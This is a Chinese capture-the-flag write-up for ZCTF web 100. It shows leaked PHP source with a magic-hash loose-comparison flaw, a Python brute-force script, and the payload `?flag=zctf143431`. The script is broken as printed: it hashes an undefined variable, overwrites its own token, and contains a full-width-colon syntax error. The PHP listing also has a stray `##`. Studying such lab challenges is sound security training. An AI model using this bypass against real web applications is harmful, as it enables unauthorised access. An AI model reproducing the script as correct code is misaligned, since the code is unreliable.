## ZCTF web 100

分类：脚本开发

## write-up

打开网页只有`ha?`的内容，猜测是有源码泄露。爆破后，发现存在`.index.php.swp`文件中存在源码如下：

```php
<?php
$flag = $_GET['flag'];
if ($flag != '15562') {
    if (strstr($flag, 'zctf')) {
        if (substr(md5($flag),8,16) == substr(md5('15562'),8,16)) {
            die('ZCTF{#########}');
        }
    }##
}
die('ha?');
?>
```

限制flag参数的md5必须为一个固定的0e开头的md5，并且同时含有zctf字符串。写代码进行爆破，代码如下：

```python
import hashlib

def hack():
    for i in xrange(999999999):
        token = 'zctf' + str(i)
        m = hashlib.md5()
        m.update(s)
        token = m.hexdigest()
        flag = True
        if token[8:10] == '0e':
            for j in token[10:24]:
                if j.isalpha():
                    flag = False
                    break
            if flag:
                print(s)
                break
if __name__ == '__main__'：
    hack()
```

`payload1:?flag=zctf143431`